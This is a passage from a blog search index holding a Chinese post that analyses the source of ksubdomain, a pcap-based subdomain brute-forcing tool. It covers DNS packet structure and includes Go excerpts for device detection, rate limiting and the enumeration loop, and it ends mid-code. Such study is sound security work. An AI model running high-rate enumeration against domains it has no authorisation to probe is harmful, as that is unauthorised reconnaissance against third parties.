<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ksbudomain源码分析</title>
    <link href="/2023/09/16/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/ksbudomain%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/09/16/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/ksbudomain%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="ksbudomain源码学习"><a href="#ksbudomain源码学习" class="headerlink" title="ksbudomain源码学习"></a>ksbudomain源码学习</h1><p>项目地址：<a href="https://github.com/boy-hack/ksubdomain">https://github.com/boy-hack/ksubdomain</a></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="无状态"><a href="#无状态" class="headerlink" title="无状态"></a>无状态</h3><p>无状态连接是指无需关系 TCP、UDP 协议状态，不占用系统协议栈资源，忘记 SYN、ACK、FIN、TIMEWIT，不进行会话组包。在实现上也有可能把必要的信息存放在数据包本身。如 masscan、zmp 都使用了这种无状态技术。</p><h3 id="pcap"><a href="#pcap" class="headerlink" title="pcap"></a>pcap</h3><p>Pcap是 <a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a> <a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86">网络管理</a>领域中一个用于 <a href="https://zh.wikipedia.org/wiki/%E6%95%B8%E6%93%9A%E5%8C%85%E5%88%86%E6%9E%90%E5%99%A8">捕获网络流量</a>的 <a href="https://zh.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3">应用程序接口</a>（API）。其名称来源于“抓包”（英语：packet capture）（并非它的正确名称）。Pcap是用 <a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80">C语言</a>编写的。在 <a href="https://zh.wikipedia.org/wiki/%E7%B1%BBUnix%E7%B3%BB%E7%BB%9F">类Unix系统</a>中libpcap <a href="https://zh.wikipedia.org/wiki/%E5%87%BD%E5%BC%8F%E5%BA%AB">库</a>实现了pcap；在 <a href="https://zh.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>上，则由Npcap库移植了libpcap， <a href="https://zh.wikipedia.org/wiki/Windows_7">Windows 7</a>中可以使用WinPcap库的移植，但现已不再维护。</p><p>监控软件可以使用 pcap 来捕获在 <a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E7%B6%B2%E8%B7%AF">计算机网络</a>上传输的 <a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E5%B0%81%E5%8C%85">网络数据包</a>。</p><h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>DNS 域名解析协议，它的作用就是将域名解析为 IP 地址。</p><h4 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h4><p>DNS 协议可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53，但大多数情况下 DNS 都使用 UDP 进行传输。</p><p>DNS 报文包括请求报文和应答报文，它们格式是相同的，如下所示：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309151713181.png" alt="img"></p><h4 id="报文头部"><a href="#报文头部" class="headerlink" title="报文头部"></a>报文头部</h4><ul><li>标识 <code>(identifier)</code>：一个 16 位的 ID ，在应答中原样返回，以此匹配请求和应答；</li><li>标志 <code>(flags)</code>：描述 DNS 报文的类别和工作特性，共 16 位；</li><li>问题记录数 <code>(question count)</code>：一个 16 位整数，表示问题节中的记录个数；</li><li>答案记录数 <code>(answer count)</code>：一个 16 位整数，表示答案节中的记录个数；</li><li>授权信息记录数 <code>(authority record count)</code> ：一个 16 位整数，表示授权信息节中的记录个数；</li><li>附加信息记录数 <code>(additional record count)</code> ：一个 16 位整数，表示附加信息节中的记录个数；</li></ul><p>标志：</p><ul><li><code>QR</code>：用来区别请求和应答，0 表示请求报文，1 表示应答报文，占 1 位</li><li>操作码 <code>(Opcode)</code>：用来定义操作类型，占 4 位<ul><li>0 代表标准查询（ 正向解析 ）</li><li>1 代表反向查询（ 反向解析 ）</li><li>2 代表服务器状态请求</li></ul></li><li><code>AA</code> ： 权威回答<code>(authoritative answer)</code>，意味着当前查询结果是由域名的权威服务器给出的；</li><li><code>TC</code> ： 截短<code>(truncated)</code>，使用 UDP 时，如果应答超过 512 字节，只返回前 512 个字节；</li><li><code>RD</code> ：期望递归 <code>(recursion desired)</code>，在请求中设置，并在应答中返回；<ul><li>该位为 1 时，服务器必须处理这个请求：如果服务器没有授权回答，它必须替客户端请求其他 DNS 服务器，这也是所谓的 递归查询 ；</li><li>该位为 0 时，如果服务器没有授权回答，它就返回一个能够处理该查询的服务器列表给客户端，由客户端自己进行 迭代查询 ；</li></ul></li><li><code>RA</code> ：可递归 <code>(recursion available)</code>，如果服务器支持递归查询，就会在应答中设置该位，以告知客户端</li><li>保留：这 3 位目前未用，留作未来扩展；</li><li>响应码 <code>(response code)</code>：占 4 位，表示请求结果，常见的值包括：<ul><li>0 表示没有差错；</li><li>3 表示名字差错，该差错由权威服务器返回，表示待查询的域名不存在；</li></ul></li></ul><h4 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h4><p>DNS 报文数据部分由 4 个变长部分组成，请求报文中常常只有问题部分有内容，而其他 3 个部分的资源记录数为 0 。</p><p>DNS 问题部分由一组问题记录组成，包含如下内容：</p><ul><li>待查询域名 <code>(name)</code></li><li>查询类型 <code>(type)</code></li><li>查询类别 <code>(class)</code></li></ul><p>查询类型：</p><table><thead><tr><th align="left">查询类型</th><th align="left">名称代码</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">A</td><td align="left">IPv4地址</td></tr><tr><td align="left">2</td><td align="left">NS</td><td align="left">名称服务器</td></tr><tr><td align="left">5</td><td align="left">CNAME</td><td align="left">规范名称</td></tr><tr><td align="left">15</td><td align="left">MX</td><td align="left">电子邮件交互</td></tr><tr><td align="left">16</td><td align="left">TXT</td><td align="left">文本信息</td></tr><tr><td align="left">28</td><td align="left">AAAA</td><td align="left">IPv6地址</td></tr></tbody></table><p>查询类别：取 1 时表示 Internet 协议</p><h4 id="资源记录"><a href="#资源记录" class="headerlink" title="资源记录"></a>资源记录</h4><p>服务端处理查询请求后，需要向客户端发送应答报文；域名查询结果作为资源记录，保存在答案以及其后两节中。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309151737291.png" alt="img"></p><p>资源记录结构和问题记录非常相似，它总共有 6 个字段，前 3 个和问题记录完全一样：</p><ul><li>被查询域名</li><li>查询类型</li><li>类</li><li>有效期 <code>(TTL)</code>：域名记录一般不会频繁改动，所以在有效期内可以将结果缓存起来，降低请求频率；</li><li>数据长度 <code>(Resource Data Length)</code>：即查询结果的长度；</li><li>数据 <code>(Resource Data)</code> ：即查询结果；</li></ul><h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>请求报文：问题这里就是 <code>baidu.com</code> 的 A 记录：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309151926753.png" alt="image-20230915192613680"></p><p>响应报文：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309151926384.png" alt="image-20230915192659251"></p><h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>ksubdomain 使用 pcap 发包和接收数据，会直接将数据包发送至网卡，不经过系统，使速度大大提升。</p><p>由于又是 udp 协议，数据包丢失的情况很多，所以 ksubdomain 在程序中建立了“状态表”，用于检测数据包的状态，当数据包发送时，会记录下状态，当收到了这个数据包的回应时，会从状态表去除，如果一段时间发现数据包没有动作，便可以认为这个数据包已经丢失了，于是会进行重发，当重发到达一定次数时，就可以舍弃该数据包了。</p><p>上面说 ksubdomain 是无状态发包，如何建立确认状态呢？</p><p>根据 DNS 协议和 UDP 协议的一些特点，DNS 协议中 ID 字段，UDP 协议中 SrcPort 字段可以携带数据，在我们收到返回包时，这些字段的数据不会改变。所以利用这些字段的值来确认这个包是我们需要的，并且找到状态表中这个包的位置。</p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">D:.<br>│  ksubdomain.yaml# 网卡配置信息<br>├─cmd# 命令参数相关<br>│  └─ksubdomain<br>│          cmd.go<br>│          enum.go# 枚举模式<br>│          test.go# 测试本地网卡的最大发送速度<br>│          verify.go# 验证模式<br>├─core<br>│  │  banner.go# Banner 信息<br>│  │  subdata.go# 子域名相关(内嵌,获取切片)<br>│  │  util.go# 工具类<br>│  │  wildcard.go# 泛解析域名判断<br>│  ├─device<br>│  │      device.go# 获取网卡信息,初始化 pcap<br>│  │      struct.go<br>│  ├─dns<br>│  │      ns.go# NS 记录<br>│  │      ns_test.go<br>│  ├─gologger<br>│  │      gologger.go# 日志<br>│  └─options<br>│          options.go# 配置信息及相关方法<br>└─runner<br>    │  recv.go# 捕获数据包并获取其中的答案记录<br>    │  result.go# 结果相关<br>    │  retry.go# 超时重置机制<br>    │  runner.go# 枚举主函数<br>    │  send.go# 使用 gopacket 发送自定义的 DSN 数据包<br>    │  testspeed.go# 测试本地网卡的最大发送速度<br>    │  wildcard.go# 泛解析过滤<br>    ├─outputter# 输出相关<br>    ├─processbar# 过程(成功,失败...)<br>    ├─result# 结果结构体<br>    └─statusdb# 使用 sync.Map 实现一个内存简易读写数据库<br></code></pre></td></tr></table></figure><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="枚举模块"><a href="#枚举模块" class="headerlink" title="枚举模块"></a>枚举模块</h3><p>枚举模块大致流程：</p><ol><li>根据根域名及前缀拼接获取总子域名</li><li>通过请求域名然后捕获数据包提取本机的网卡信息</li><li>启动接收线程 ，启动发送线程 ，启动输出线程</li><li>向发送线程中传入总子域名目标</li><li>发送完成后启动重试机制的线程</li><li>然后就是一个死的 <code>for</code> 循环 + <code>select...case</code>，定时检测目标是否检测完成</li><li>检测完成，退出各个线程，关闭各通道</li></ol><p><code>enum.go</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 获取网卡配置</span><br>opt.EtherInfo = options.GetDeviceConfig()<br>ctx := context.Background()<br><span class="hljs-comment">// 创建一个 runner</span><br>r, err := runner.New(opt)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    gologger.Fatalf(<span class="hljs-string">&quot;%s\n&quot;</span>, err.Error())<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// 启动枚举</span><br>r.RunEnumeration(ctx)<br>r.Close()<br></code></pre></td></tr></table></figure><p>先看下获取网卡配置：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309162132121.png" alt="image-20230916213233036"></p><p>主要是 <code>device.AutoGetDevices()</code> ：</p><p>这个主要就是去使用 <code>net.LookupHost(domain)</code> 发起一个 DNS 请求，然后抓网卡包获取 DNS 数据包且问题为 <code>domain</code> 的，然后从它的 <code>Ethernet </code> 获取信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">AutoGetDevices</span><span class="hljs-params">()</span></span> *EtherTable &#123;<br>domain := core.RandomStr(<span class="hljs-number">4</span>) + <span class="hljs-string">&quot;.i.hacking8.com&quot;</span><br>signal := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *EtherTable)<br><span class="hljs-comment">// 获取所有设备</span><br>devices, err := pcap.FindAllDevs()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Fatalf(<span class="hljs-string">&quot;获取网络设备失败:%s\n&quot;</span>, err.Error())<br>&#125;<br>data := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]net.IP)<br>keys := []<span class="hljs-type">string</span>&#123;&#125;<br><span class="hljs-comment">// 获取 ipv4 且不是回环地址的设备名称</span><br><span class="hljs-keyword">for</span> _, d := <span class="hljs-keyword">range</span> devices &#123;<br><span class="hljs-keyword">for</span> _, address := <span class="hljs-keyword">range</span> d.Addresses &#123;<br>ip := address.IP<br><span class="hljs-keyword">if</span> ip.To4() != <span class="hljs-literal">nil</span> &amp;&amp; !ip.IsLoopback() &#123;<br>data[d.Name] = ip<br>keys = <span class="hljs-built_in">append</span>(keys, d.Name)<br>&#125;<br>&#125;<br>&#125;<br>ctx := context.Background()<br><span class="hljs-comment">// 在初始上下文的基础上创建一个有取消功能的上下文</span><br>ctx, cancel := context.WithCancel(ctx)<br><span class="hljs-keyword">for</span> _, drviceName := <span class="hljs-keyword">range</span> keys &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(drviceName <span class="hljs-type">string</span>, domain <span class="hljs-type">string</span>, ctx context.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> (<br>snapshot_len <span class="hljs-type">int32</span>         = <span class="hljs-number">1024</span><br>promiscuous  <span class="hljs-type">bool</span>          = <span class="hljs-literal">false</span><br>timeout      time.Duration = <span class="hljs-number">-1</span> * time.Second<br>handle       *pcap.Handle<br>)<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-comment">// 使用 pcap.OpenLive 打开设备的抓包会话</span><br>handle, err = pcap.OpenLive(<br>drviceName,   <span class="hljs-comment">// 设备名</span><br>snapshot_len, <span class="hljs-comment">// 捕获数据包的最大长度</span><br>promiscuous,  <span class="hljs-comment">// 不启用混杂模式 ( 只要发给自己的数据包 )</span><br>timeout,      <span class="hljs-comment">// 超时机制, -1 则一直等待重试</span><br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Errorf(<span class="hljs-string">&quot;pcap打开失败:%s\n&quot;</span>, err.Error())<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> handle.Close()<br><span class="hljs-comment">// Use the handle as a packet source to process all packets</span><br><span class="hljs-comment">// 创建一个数据包源，用于处理所有捕获到的数据包</span><br>packetSource := gopacket.NewPacketSource(handle, handle.LinkType())<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">// 获取一个数据包</span><br>packet, err := packetSource.NextPacket()<br>gologger.Printf(<span class="hljs-string">&quot;.&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 检查数据包是否包含 DNS 层</span><br><span class="hljs-keyword">if</span> dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != <span class="hljs-literal">nil</span> &#123;<br>dns, _ := dnsLayer.(*layers.DNS)<br><span class="hljs-comment">// 判断是否为应答报文</span><br><span class="hljs-keyword">if</span> !dns.QR &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> dns.Questions &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-type">string</span>(v.Name) == domain &#123;<br>ethLayer := packet.Layer(layers.LayerTypeEthernet)<br><span class="hljs-keyword">if</span> ethLayer != <span class="hljs-literal">nil</span> &#123;<br>eth := ethLayer.(*layers.Ethernet)<br><span class="hljs-comment">// 获取信息</span><br>etherTable := EtherTable&#123;<br>SrcIp:  data[drviceName],<br>Device: drviceName,<br>SrcMac: SelfMac(eth.DstMAC),<br>DstMac: SelfMac(eth.SrcMAC),<br>&#125;<br>signal &lt;- &amp;etherTable<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;(drviceName, domain, ctx)<br>&#125;<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-comment">// 获取配置信息后退出协程</span><br><span class="hljs-keyword">case</span> c := &lt;-signal:<br>cancel()<br>fmt.Print(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-keyword">return</span> c<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">// 发起 DNS 请求, 从数据包中获取硬件信息</span><br>_, _ = net.LookupHost(domain)<br>time.Sleep(time.Second * <span class="hljs-number">1</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>runner.New(opt)</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">New</span><span class="hljs-params">(opt *options.Options)</span></span> (*runner, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>version := pcap.Version()<br>r := <span class="hljs-built_in">new</span>(runner)<br>gologger.Infof(version + <span class="hljs-string">&quot;\n&quot;</span>)<br>r.options = opt<br>r.hm = statusdb.CreateMemoryDB()<br>gologger.Infof(<span class="hljs-string">&quot;Default DNS:%s\n&quot;</span>, core.SliceToString(opt.Resolvers))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(opt.SpecialResolvers) &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">var</span> keys []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> k, _ := <span class="hljs-keyword">range</span> opt.SpecialResolvers &#123;<br>keys = <span class="hljs-built_in">append</span>(keys, k)<br>&#125;<br>gologger.Infof(<span class="hljs-string">&quot;Special DNS:%s\n&quot;</span>, core.SliceToString(keys))<br>&#125;<br><span class="hljs-comment">// 打开 Pcap 捕获数据包</span><br>r.handle, err = device.PcapInit(opt.EtherInfo.Device)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// 根据发包总数和 timeout 时间来分配每秒速度</span><br>allPacket := opt.DomainTotal<br>calcLimit := <span class="hljs-type">float64</span>(allPacket/opt.TimeOut) * <span class="hljs-number">0.85</span><br><span class="hljs-keyword">if</span> calcLimit &lt; <span class="hljs-number">5000</span> &#123;<br>calcLimit = <span class="hljs-number">5000</span><br>&#125;<br>limit := <span class="hljs-type">int</span>(math.Min(calcLimit, <span class="hljs-type">float64</span>(opt.Rate)))<br><span class="hljs-comment">// 限制单位时间内允许通过的请求数目</span><br>r.limit = ratelimit.New(limit)<br>gologger.Infof(<span class="hljs-string">&quot;Domain Count:%d\n&quot;</span>, r.options.DomainTotal)<br>gologger.Infof(<span class="hljs-string">&quot;Rate:%dpps\n&quot;</span>, limit)<br><br>r.sender = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">99</span>)        <span class="hljs-comment">// 协程发送缓冲</span><br>r.recver = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> result.Result, <span class="hljs-number">99</span>) <span class="hljs-comment">// 协程接收缓冲</span><br><span class="hljs-comment">// 获取一个空闲的端口</span><br>freePort, err := freeport.GetFreePort()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// 获取 layers 类型</span><br>r.dnsType, err = options.DnsType(opt.DnsType)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>r.freeport = freePort<br>gologger.Infof(<span class="hljs-string">&quot;FreePort:%d\n&quot;</span>, freePort)<br>r.dnsid = <span class="hljs-number">0x2021</span> <span class="hljs-comment">// set dnsid 65500</span><br>r.maxRetry = opt.Retry<br>r.timeout = <span class="hljs-type">int64</span>(opt.TimeOut)<br>r.fisrtloadChanel = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)<br>r.startTime = time.Now()<br><span class="hljs-keyword">return</span> r, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是一个 <code>RunEnumeration</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *runner)</span></span> RunEnumeration(ctx context.Context) &#123;<br>ctx, cancel := context.WithCancel(ctx)<br><span class="hljs-keyword">defer</span> cancel()<br><span class="hljs-keyword">go</span> r.recvChanel(ctx) <span class="hljs-comment">// 启动接收线程</span><br><span class="hljs-keyword">go</span> r.sendCycle()     <span class="hljs-comment">// 启动发送线程</span><br><span class="hljs-keyword">go</span> r.handleResult()  <span class="hljs-comment">// 处理结果，打印输出</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 向发送线程中传入目标域名</span><br><span class="hljs-keyword">for</span> domain := <span class="hljs-keyword">range</span> r.options.Domain &#123;<br>r.sender &lt;- domain<br>&#125;<br>r.fisrtloadChanel &lt;- <span class="hljs-string">&quot;ok&quot;</span><br>&#125;()<br><span class="hljs-keyword">var</span> isLoadOver <span class="hljs-type">bool</span> = <span class="hljs-literal">false</span><br><span class="hljs-comment">// 1s 定时器</span><br>t := time.NewTicker(<span class="hljs-number">1</span> * time.Second)<br><span class="hljs-keyword">defer</span> t.Stop()<br><span class="hljs-comment">// 等待协程运行完成</span><br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-comment">// 每秒都发送一次, 判断是否完成</span><br>        <span class="hljs-comment">// 完成之后 return 出 for 循环, defer cancel() 退出接收协程 </span><br><span class="hljs-keyword">case</span> &lt;-t.C:<br>r.printStatus()<br><span class="hljs-keyword">if</span> isLoadOver &#123;<br><span class="hljs-keyword">if</span> r.hm.Length() &lt;= <span class="hljs-number">0</span> &#123;<br>gologger.Printf(<span class="hljs-string">&quot;\n&quot;</span>)<br>gologger.Infof(<span class="hljs-string">&quot;扫描完毕&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 目标域名发送完成后就开始进行重试测试</span><br><span class="hljs-keyword">case</span> &lt;-r.fisrtloadChanel:<br><span class="hljs-keyword">go</span> r.retry(ctx)<br>isLoadOver = <span class="hljs-literal">true</span><br><span class="hljs-comment">// 程序结束</span><br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>sendCycle() </code>，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *runner)</span></span> sendCycle() &#123;<br><span class="hljs-keyword">for</span> domain := <span class="hljs-keyword">range</span> r.sender &#123;<br><span class="hljs-comment">// 启动速率限制</span><br>r.limit.Take()<br><span class="hljs-comment">// 判断是否为重试的目标</span><br>v, ok := r.hm.Get(domain)<br><span 